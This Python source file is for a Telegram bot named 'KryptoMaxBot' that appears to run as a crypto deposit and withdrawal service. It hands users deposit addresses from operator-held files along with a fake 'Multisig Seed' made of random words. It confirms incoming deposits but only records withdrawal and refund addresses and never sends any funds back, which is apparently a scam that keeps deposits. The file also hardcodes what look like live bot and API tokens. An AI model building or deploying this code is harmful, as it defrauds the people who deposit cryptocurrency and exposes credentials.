from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, Filters
import random
import requests
import time
import os

# ===== CONFIGURATION =====
BOT_TOKEN = "7415463958:AAFB-KIiUvnStRTKcqxnJTEpFonoWjl9FAA"
BLOCKCYPHER_TOKEN = "b4aa61c7eab349bcb23a897c9734b211"
BTC_ADDRESS_FILE = "btc_addresses.txt"
ETH_ADDRESS_FILE = "eth_addresses.txt"
PGP_KEY_FILE = "pgp.txt"
ADMIN_ID = 6190128347

# ===== STORAGE =====
user_states = {}
refund_addresses = {}
withdrawal_requests = {}
user_data = set()

# ===== HELPER FUNCTIONS =====
def get_pgp_key():
    try:
        with open(PGP_KEY_FILE, 'r') as f:
            return f.read().strip()
    except Exception as e:
        print(f"PGP key error: {e}")
        return "PGP key currently unavailable"

def generate_seed_phrase():
    with open("english.txt", "r") as f:
        words = f.read().splitlines()
    return " ".join(random.sample(words, 12))

def get_random_address(filename):
    try:
        with open(filename, "r") as f:
            addresses = [line.strip() for line in f if line.strip()]
        return random.choice(addresses) if addresses else None
    except:
        return None

def check_blockchain_for_tx(address, coin):
    url = f"https://api.blockcypher.com/v1/{'btc/main' if coin == 'btc' else 'eth/main'}/addrs/{address}/full?token={BLOCKCYPHER_TOKEN}"
    try:
        res = requests.get(url)
        data = res.json()
        if 'txs' in data:
            for tx in data['txs']:
                if tx.get('confirmations', 0) > 0:
                    value = tx['total'] / 1e8 if coin == 'btc' else tx['total'] / 1e18
                    return tx['hash'], value, tx['confirmations']
    except Exception as e:
        print("Blockchain check error:", e)
    return None, 0, 0

# ===== COMMAND HANDLERS =====
def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    user_data.add(user_id)
    keyboard = [
        [InlineKeyboardButton("💰 Deposit BTC", callback_data='deposit_btc')],
        [InlineKeyboardButton("💰 Deposit ETH", callback_data='deposit_eth')],
        [InlineKeyboardButton("📜 Guide", callback_data='show_guide'),
         InlineKeyboardButton("🔐 PGP Key", callback_data='show_pgp')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text("Welcome to KryptoMaxBot! Please select an option:", reply_markup=reply_markup)

def confirm(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in user_states:
        update.message.reply_text("Please start a session using /start.")
        return

    coin = user_states[user_id]["coin"]
    address = user_states[user_id]["address"]

    update.message.reply_text("⏳ Verifying your transaction on blockchain...")
    txid, value, conf = check_blockchain_for_tx(address, coin)

    if txid:
        update.message.reply_text(
            f"✅ Transaction detected!\n\n"
            f"*Amount:* {value:.6f} {coin.upper()}\n"
            f"*Confirmations:* {conf}\n"
            f"*TXID:* `{txid}`",
            parse_mode="Markdown"
        )
        update.message.reply_text("Please enter the *withdrawal address*:", parse_mode="Markdown")
        user_states[user_id]["awaiting_withdraw"] = True
    else:
        update.message.reply_text("❌ No confirmed transactions found. Try again later.")

def admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        update.message.reply_text("Unauthorized.")
        return

    keyboard = ReplyKeyboardMarkup([
        ["Users", "Deposits"],
        ["Withdrawals", "Refunds"]
    ], resize_keyboard=True)

    update.message.reply_text("👨‍💼 Admin Dashboard\nChoose an option:", reply_markup=keyboard)

def admin_panel_handler(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        return

    text = update.message.text
    if text == "Users":
        update.message.reply_text(f"👤 Total Users: {len(user_data)}")
    elif text == "Deposits":
        update.message.reply_text("Deposit addresses are loaded from file and rotated randomly.")
    elif text == "Withdrawals":
        if not withdrawal_requests:
            update.message.reply_text("No withdrawals yet.")
        else:
            for uid, addr in withdrawal_requests.items():
                update.message.reply_text(f"User {uid}: {addr}")
    elif text == "Refunds":
        if not refund_addresses:
            update.message.reply_text("No refund addresses.")
        else:
            for uid, addr in refund_addresses.items():
                update.message.reply_text(f"User {uid}: {addr}")

def pgp_command(update: Update, context: CallbackContext):
    key = get_pgp_key()
    update.message.reply_text(
        f"🔐 *KryptoMax Official PGP Key*\n\n"
        f"```\n{key}\n```\n\n"
        f"Verify all official communications with this key.",
        parse_mode="Markdown"
    )

def guide(update: Update, context: CallbackContext):
    guide_text = """
📜 *KryptoMax Guide* 🚡

1. /start - Begin session
2. Choose deposit currency
3. Send crypto to provided address
4. /confirm - Verify transaction
5. Set withdrawal address
6. (Optional) Set refund address
7. Complete transaction

🔐 Verify PGP: /pgp
"""
    update.effective_message.reply_text(guide_text, parse_mode="Markdown")

def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.answer()

    if query.data == "deposit_btc":
        phrase = generate_seed_phrase()
        btc_address = get_random_address(BTC_ADDRESS_FILE)
        user_states[user_id] = {"coin": "btc", "address": btc_address}
        msg = f"💰 *BTC Deposit Address:* `{btc_address}`\n\n🔐 *Multisig Seed:* `{phrase}`\n\nSend BTC. Auto-detection enabled.\n\nVerify PGP: /pgp"
        query.edit_message_text(msg, parse_mode="Markdown")

    elif query.data == "deposit_eth":
        phrase = generate_seed_phrase()
        eth_address = get_random_address(ETH_ADDRESS_FILE)
        user_states[user_id] = {"coin": "eth", "address": eth_address}
        msg = f"💰 *ETH Deposit Address:* `{eth_address}`\n\n🔐 *Multisig Seed:* `{phrase}`\n\nSend ETH. Auto-detection enabled.\n\nVerify PGP: /pgp"
        query.edit_message_text(msg, parse_mode="Markdown")

    elif query.data == "show_guide":
        guide(update, context)
        
    elif query.data == "show_pgp":
        key = get_pgp_key()
        query.edit_message_text(
            f"🔏 *Official Verification Key*\n\n"
            f"```\n{key}\n```\n\n"
            f"Compare with all signed messages from KryptoMax.",
            parse_mode="Markdown"
        )

def message_handler(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    msg = update.message.text

    if user_id in user_states:
        state = user_states[user_id]

        if state.get("awaiting_withdraw"):
            withdrawal_requests[user_id] = msg
            state["awaiting_withdraw"] = False
            update.message.reply_text("✅ Withdrawal address saved.")
            update.message.reply_text("Please enter a *refund address* (optional):", parse_mode="Markdown")
            state["awaiting_refund"] = True
            return

        if state.get("awaiting_refund"):
            refund_addresses[user_id] = msg
            state["awaiting_refund"] = False
            update.message.reply_text("✅ Refund address saved. Transaction flow complete!")
            return

# ===== MAIN FUNCTION =====
def main():
    # Verify required files exist
    required_files = [BTC_ADDRESS_FILE, ETH_ADDRESS_FILE, "english.txt", PGP_KEY_FILE]
    for file in required_files:
        if not os.path.exists(file):
            print(f"⚠️ Missing required file: {file}")

    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Command handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("confirm", confirm))
    dp.add_handler(CommandHandler("admin", admin))
    dp.add_handler(CommandHandler("pgp", pgp_command))
    dp.add_handler(CommandHandler("guide", guide))

    # Other handlers
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))
    dp.add_handler(MessageHandler(Filters.regex("^(Users|Deposits|Withdrawals|Refunds)$"), admin_panel_handler))

    print("✅ Bot starting with all handlers registered")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()